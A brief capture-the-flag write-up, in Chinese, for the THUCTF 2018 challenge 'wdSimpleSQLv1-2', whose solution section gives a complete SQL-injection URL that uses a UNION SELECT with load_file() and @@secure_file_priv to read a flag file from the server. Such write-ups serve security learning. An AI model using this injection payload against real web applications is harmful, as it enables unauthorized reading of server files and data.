wdSimpleSQLv1-2 150 points
================

题意
-------------

会长为了早日解决人生大计，特地嘱咐我们出题的时候注意一下，多宣传宣传他。为了响应会长的号召，我特地为团队写了一个大牛展示页面，但是还没写完，里面好像有问题？？？（好像忘记把会长的信息加到数据库了，逃，谁能帮我加进去下，不然会长会打死我的

(PS: Please submit the flag in filesystem)

http://host:port

attachment: wdSimpleSQLv1.zip

解题步骤
-------------

注入地点和 [wdSimpleSQLv1-1.md](wdSimpleSQLv1-1.md) 相同，只不过要读入文件。页面中说明要读入 `@@global.secure_file_priv/flag`。这样即可获取到 `flag`：

```
http://wdsimplesqlv1.thuctf2018.game.redbud.info:23334/bigcow?cowname=%27union%20all%20select%20TABLE_NAME,load_file(concat(@@secure_file_priv,%22flag%22)),TABLE_NAME,TO_BASE64(DATA_LENGTH)%20from%20INFORMATION_SCHEMA.TABLES%20limit%201%20offset%2060%23
```